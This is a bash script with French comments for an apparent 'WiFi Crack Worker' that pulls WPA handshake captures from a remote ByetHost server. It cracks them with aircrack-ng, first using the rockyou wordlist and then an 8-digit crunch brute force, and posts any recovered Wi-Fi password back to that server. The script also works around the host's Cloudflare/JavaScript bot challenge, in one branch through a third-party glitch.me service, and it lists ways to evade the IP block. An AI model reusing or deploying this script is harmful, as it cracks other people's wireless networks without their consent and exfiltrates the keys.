#!/bin/bash
SITE_URL="https://wifi-wpa.byethost3.com"
TOKEN="MonTokenSecret123456"
UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0"

# Fichier pour persister les cookies de session ByetHost
COOKIE_JAR="/tmp/byethost_cookies_$$.txt"

# ─────────────────────────────────────────────────────────
# Fonctions réseau avec contournement ByetHost/Cloudflare
# ─────────────────────────────────────────────────────────

# Nettoie les fichiers temporaires en fin d'exécution
cleanup() {
    rm -f "$COOKIE_JAR" /tmp/byethost_headers.txt /tmp/challenge.html /tmp/check_result.txt /tmp/rockyou_dl.txt 2>/dev/null
}
trap cleanup EXIT

# Tente d'acquérir le cookie de session __test de ByetHost.
# ByetHost utilise un JavaScript Challenge (ou Cloudflare)
# qui définit un cookie __test avant d'autoriser les requêtes.
# Retourne le cookie sur stdout, ou chaîne vide si échec.
acquire_byethost_cookie() {
    echo "[*] Acquisition du cookie de session ByetHost..." >&2

    # ── Requête initiale vers la racine ──
    curl -s -c "$COOKIE_JAR" -c /tmp/byethost_headers.txt -A "$UA" \
        -D /tmp/byethost_headers.txt \
        -o /tmp/challenge.html \
        -L --max-redirs 3 \
        "${SITE_URL}/" > /dev/null 2>&1

    # ── Méthode 1 : Cookie déjà dans le cookie jar ──
    local COOKIE_VAL
    COOKIE_VAL=$(grep -E "__test|_test" "$COOKIE_JAR" 2>/dev/null | tail -1 | awk '{print $NF}')
    if [ -n "$COOKIE_VAL" ]; then
        echo "[+] Cookie ByetHost trouvé dans le jar: ${COOKIE_VAL}" >&2
        echo "$COOKIE_VAL"
        return 0
    fi

    # ── Méthode 2 : Extraction depuis l'en-tête Set-Cookie ──
    COOKIE_VAL=$(grep -i "Set-Cookie.*__test\|Set-Cookie.*_test" /tmp/byethost_headers.txt 2>/dev/null | \
        sed -n 's/.*\(__test\|_test\)=\([^;]*\).*/\2/p' | head -1)
    if [ -n "$COOKIE_VAL" ]; then
        echo "[+] Cookie extrait depuis Set-Cookie header: ${COOKIE_VAL}" >&2
        # Sauvegarde dans le cookie jar pour l'utiliser plus tard
        echo -e "${SITE_URL}\tFALSE\t/\tFALSE\t0\t__test\t${COOKIE_VAL}" >> "$COOKIE_JAR" 2>/dev/null
        echo "$COOKIE_VAL"
        return 0
    fi

    # ── Méthode 3 : Extraction depuis le JavaScript (pattern document.cookie) ──
    COOKIE_VAL=$(grep -oP 'document\.cookie\s*=\s*["\x27][^"\x27]*__test=\K[^"\x27;]+' /tmp/challenge.html 2>/dev/null | head -1)
    if [ -n "$COOKIE_VAL" ]; then
        echo "[+] Cookie extrait depuis le JS challenge: ${COOKIE_VAL}" >&2
        echo -e "${SITE_URL}\tFALSE\t/\tFALSE\t0\t__test\t${COOKIE_VAL}" >> "$COOKIE_JAR" 2>/dev/null
        echo "$COOKIE_VAL"
        return 0
    fi

    # ── Méthode 4 : Pattern _test=hexadécimal (32 caractères) ──
    COOKIE_VAL=$(grep -oP '_test=\K[a-f0-9]{32}' /tmp/challenge.html 2>/dev/null | head -1)
    if [ -n "$COOKIE_VAL" ]; then
        echo "[+] Cookie _test extrait (pattern hex): ${COOKIE_VAL}" >&2
        echo -e "${SITE_URL}\tFALSE\t/\tFALSE\t0\t__test\t${COOKIE_VAL}" >> "$COOKIE_JAR" 2>/dev/null
        echo "$COOKIE_VAL"
        return 0
    fi

    # ── Méthode 5 : Service getbyethostcookie.glitch.me ──
    echo "[!] Tentative via getbyethostcookie.glitch.me..." >&2
    local JS_BODY
    JS_BODY=$(cat /tmp/challenge.html 2>/dev/null)
    if [ -n "$JS_BODY" ]; then
        local GLITCH_RESP
        GLITCH_RESP=$(curl -s -A "$UA" -X POST \
            --data-urlencode "jscode=${JS_BODY}" \
            "https://getbyethostcookie.glitch.me/" 2>/dev/null)
        COOKIE_VAL=$(echo "$GLITCH_RESP" | grep -oP '__test=\K[^;& ]+' | head -1)
        if [ -n "$COOKIE_VAL" ]; then
            echo "[+] Cookie obtenu via glitch.me: ${COOKIE_VAL}" >&2
            echo -e "${SITE_URL}\tFALSE\t/\tFALSE\t0\t__test\t${COOKIE_VAL}" >> "$COOKIE_JAR" 2>/dev/null
            echo "$COOKIE_VAL"
            return 0
        fi
    fi

    # ── Aucune méthode n'a fonctionné ──
    echo "[-] Aucun cookie obtenu. Le site utilise un challenge JS avancé." >&2
    echo "[-] Extrait de la réponse du challenge (10 premiers lignes) :" >&2
    head -10 /tmp/challenge.html 2>/dev/null | sed 's/^/    /' >&2
    echo ""
    return 1
}

# Wrapper curl : utilise automatiquement le cookie jar de session
curl_api() {
    curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -A "$UA" \
        -H "Accept: application/json, text/plain, */*" \
        -H "Accept-Language: en-US,en;q=0.9" \
        "$@"
}

curl_post() {
    curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -A "$UA" \
        -H "Accept: application/json, text/plain, */*" \
        -H "Accept-Language: en-US,en;q=0.9" \
        -X POST --data-urlencode "$@"
}

# ─────────────────────────────────────────────────────────
# Fonction de rapport de progression
# ─────────────────────────────────────────────────────────

report() {
    local msg="$1"
    local encoded_msg
    encoded_msg=$(echo "$msg" | sed 's/ /%20/g; s/é/e/g; s/è/e/g; s/ê/e/g; s/à/a/g; s/ù/u/g; s/ç/c/g; s/â/a/g; s/î/i/g; s/ô/o/g; s/û/u/g')
    curl -s -b "$COOKIE_JAR" -c "$COOKIE_JAR" -A "$UA" -o /dev/null \
        "${SITE_URL}/api_progress.php?token=${TOKEN}&job_id=${JOB_ID}&progress=${encoded_msg}" \
        2>/dev/null || true
}

# ═════════════════════════════════════════════════════════
#                      PROGRAMME PRINCIPAL
# ═════════════════════════════════════════════════════════

echo ""
echo "╔══════════════════════════════════════════════════════╗"
echo "║           WiFi Crack Worker - v2.0                   ║"
echo "║           $(date -u)                  ║"
echo "╚══════════════════════════════════════════════════════╝"
echo ""

# ─────────────────────────────────────────────────────────
# ÉTAPE 0 : Acquisition du cookie de session ByetHost
# ─────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 0 : Session ByetHost"
echo "──────────────────────────────────────────────────────"
echo ""

TEST_COOKIE=$(acquire_byethost_cookie)

if [ -z "$TEST_COOKIE" ]; then
    echo ""
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║  ⚠️  PAS DE COOKIE DE SESSION DISPONIBLE                    ║"
    echo "║                                                              ║"
    echo "║  Le serveur ByetHost (wifi-wpa.byethost3.com) est           ║"
    echo "║  protégé par un challenge JavaScript. Les requêtes          ║"
    echo "║  depuis un runner GitHub Actions (IP Azure) peuvent         ║"
    echo "║  être bloquées.                                             ║"
    echo "║                                                              ║"
    echo "║  Tentative en mode dégradé...                               ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
fi

# ─────────────────────────────────────────────────────────
# ÉTAPE 1 : Vérification des jobs disponibles
# ─────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 1 : Vérification des jobs"
echo "──────────────────────────────────────────────────────"
echo ""

RESPONSE=$(curl_api "${SITE_URL}/api_status.php?token=${TOKEN}")
echo "  Réponse brute de l'API : [${RESPONSE}]"
echo ""

# ── Vérification : réponse HTML (challenge Cloudflare) au lieu de JSON ──
if echo "$RESPONSE" | grep -qi "<html\|<script\|<body\|cloudflare\|challenge\|cf-browser-verify\|cf-chl-opt"; then
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║  ❌ BLOQUÉ PAR CLOUDFLARE / BYETHOST                       ║"
    echo "║                                                              ║"
    echo "║  L'API a retourné une page HTML au lieu du JSON attendu.   ║"
    echo "║                                                              ║"
    echo "║  DIAGNOSTIC :                                                ║"
    echo "║  Le runner GitHub Actions est sur une IP Azure qui est      ║"
    echo "║  bloquée par le JS Challenge de Cloudflare/ByetHost.        ║"
    echo "║                                                              ║"
    echo "║  SOLUTIONS POSSIBLES :                                      ║"
    echo "║  1. Self-hosted runner : utilisez un runner GitHub          ║"
    echo "║     hébergé sur votre propre machine (IP résidentielle).    ║"
    echo "║                                                              ║"
    echo "║  2. Proxy relais : faites passer les appels API via un      ║"
    echo "║     proxy ou un VPS avec une IP non-Azure.                  ║"
    echo "║                                                              ║"
    echo "║  3. Cloudflare bypass action : utilisez une action          ║"
    echo "║     GitHub comme xiaotianxt/bypass-cloudflare-for-github-action"
    echo "║                                                              ║"
    echo "║  4. Hébergez le worker ailleurs : utilisez un VPS/VM        ║"
    echo "║     au lieu de GitHub Actions pour exécuter crack.sh.       ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo ""
    echo "  Extrait de la réponse HTML reçue :"
    echo "$RESPONSE" | tr -d '\n' | sed 's/<[^>]*>//g' | head -c 200
    echo ""
    echo ""
    exit 1
fi

# ── Vérification : réponse vide ──
if [ -z "$RESPONSE" ]; then
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║  ❌ RÉPONSE VIDE                                           ║"
    echo "║  L'API a retourné une réponse vide.                        ║"
    echo "║  ByetHost bloque probablement cette IP.                    ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    exit 1
fi

# ── Vérification : JSON valide ──
if ! echo "$RESPONSE" | jq . >/dev/null 2>&1; then
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║  ❌ RÉPONSE NON-JSON                                       ║"
    echo "║  L'API n'a pas retourné du JSON valide.                    ║"
    echo "║  Contenu reçu : ${RESPONSE}                                ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    exit 1
fi

# ── Extraction des infos du job ──
JOB_ID=$(echo "$RESPONSE" | jq -r '.job.id' 2>/dev/null)
ESSID=$(echo "$RESPONSE" | jq -r '.job.essid // ""' 2>/dev/null)

if [ "$JOB_ID" == "null" ] || [ -z "$JOB_ID" ]; then
    echo "  ✅ Aucune tâche en attente. Fin du worker."
    echo ""
    exit 0
fi

echo "  ✅ Job #${JOB_ID} trouvé !"
echo "     ESSID  : '${ESSID}'"
echo ""

# ─────────────────────────────────────────────────────────
# ÉTAPE 2 : Téléchargement du fichier .cap
# ─────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 2 : Téléchargement du fichier .cap"
echo "──────────────────────────────────────────────────────"
echo ""

report "Telechargement du fichier"

curl_api -o "capture_${JOB_ID}.cap" \
    "${SITE_URL}/api_download.php?token=${TOKEN}&id=${JOB_ID}"

if [ ! -f "capture_${JOB_ID}.cap" ] || [ ! -s "capture_${JOB_ID}.cap" ]; then
    echo "  ❌ Fichier vide ou introuvable après téléchargement"
    report "Fichier vide ou introuvable"

    # Tente de reporter l'échec (même si l'API update peut aussi échouer)
    curl_post "id=${JOB_ID}&status=failed&password=" \
        "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true

    exit 1
fi

# Taille du fichier (compatible Linux/macOS)
if command -v stat &>/dev/null; then
    SIZE=$(stat -c%s "capture_${JOB_ID}.cap" 2>/dev/null || stat -f%z "capture_${JOB_ID}.cap" 2>/dev/null || echo "?")
else
    SIZE=$(wc -c < "capture_${JOB_ID}.cap" 2>/dev/null || echo "?")
fi

echo "  ✅ Téléchargé : ${SIZE} octets"
report "Fichier telecharge (${SIZE} octets)"
echo ""

# ─────────────────────────────────────────────────────────
# ÉTAPE 3 : Vérification du handshake
# ─────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 3 : Vérification du handshake"
echo "──────────────────────────────────────────────────────"
echo ""

aircrack-ng "capture_${JOB_ID}.cap" > /tmp/check_result.txt 2>&1
cat /tmp/check_result.txt
echo ""

if ! grep -q "WPA (1 handshake)" /tmp/check_result.txt; then
    echo "  ❌ Pas de handshake WPA valide dans le fichier"
    report "Pas de handshake valide"

    curl_post "id=${JOB_ID}&status=failed&password=" \
        "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true

    rm -f "capture_${JOB_ID}.cap" /tmp/check_result.txt
    exit 1
fi

echo "  ✅ Handshake valide détecté !"
echo ""

# ─────────────────────────────────────────────────────────
# ÉTAPE 4 : Attaque par dictionnaire (rockyou.txt)
# ─────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 4 : Attaque dictionnaire rockyou.txt"
echo "──────────────────────────────────────────────────────"
echo ""

report "Test rockyou.txt"

ARGS=""
[ -n "$ESSID" ] && ARGS="-e \"$ESSID\""

aircrack-ng -w /usr/share/wordlists/rockyou.txt $ARGS \
    "capture_${JOB_ID}.cap" > result.txt 2>&1

if grep -q "KEY FOUND" result.txt; then
    PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}' | xargs)
    echo "  ✅ Mot de passe trouvé (rockyou) : [${PWD}]"
    echo ""
    report "Mot de passe trouve"

    curl_post "id=${JOB_ID}&status=cracked&password=${PWD}" \
        "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true

    rm -f "capture_${JOB_ID}.cap" result.txt /tmp/check_result.txt wordlist_custom.txt 2>/dev/null
    exit 0
fi

echo "  ❌ Pas trouvé dans rockyou.txt (100k premiers mots)"
echo ""

# ─────────────────────────────────────────────────────────
# ÉTAPE 5 : Force brute 8 chiffres (00000000 → 99999999)
# ─────────────────────────────────────────────────────────
echo "──────────────────────────────────────────────────────"
echo "  ÉTAPE 5 : Force brute 8 chiffres"
echo "──────────────────────────────────────────────────────"
echo ""

report "Force brute 8 chiffres en cours"

echo "  Génération de la wordlist avec crunch..."
crunch 8 8 0123456789 -o wordlist_custom.txt 2>/dev/null

if [ -f wordlist_custom.txt ] && [ -s wordlist_custom.txt ]; then
    echo "  Wordlist générée. Lancement du cracking (cela peut prendre du temps)..."
    report "Force brute en cours"

    aircrack-ng -w wordlist_custom.txt $ARGS \
        "capture_${JOB_ID}.cap" > result.txt 2>&1

    if grep -q "KEY FOUND" result.txt; then
        PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}' | xargs)
        echo "  ✅ Mot de passe trouvé (brute force) : [${PWD}]"
        echo ""
        report "Mot de passe trouve"

        curl_post "id=${JOB_ID}&status=cracked&password=${PWD}" \
            "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true

        rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt /tmp/check_result.txt
        exit 0
    fi

    echo "  ❌ Force brute 8 chiffres : échec"
    report "Force brute echec"
else
    echo "  ❌ crunch n'a pas généré la wordlist (outil manquant ?)"
    report "Crunch a echoue"
fi

echo ""

# ─────────────────────────────────────────────────────────
# ÉCHEC FINAL
# ─────────────────────────────────────────────────────────
echo "╔══════════════════════════════════════════════════════╗"
echo "║  ❌  ÉCHEC — Mot de passe non trouvé                ║"
echo "╚══════════════════════════════════════════════════════╝"

curl_post "id=${JOB_ID}&status=failed&password=" \
    "${SITE_URL}/api_update.php?token=${TOKEN}" 2>/dev/null || true

# Nettoyage
rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt /tmp/check_result.txt 2>/dev/null

echo ""
echo "  ✅ Worker terminé."
echo ""
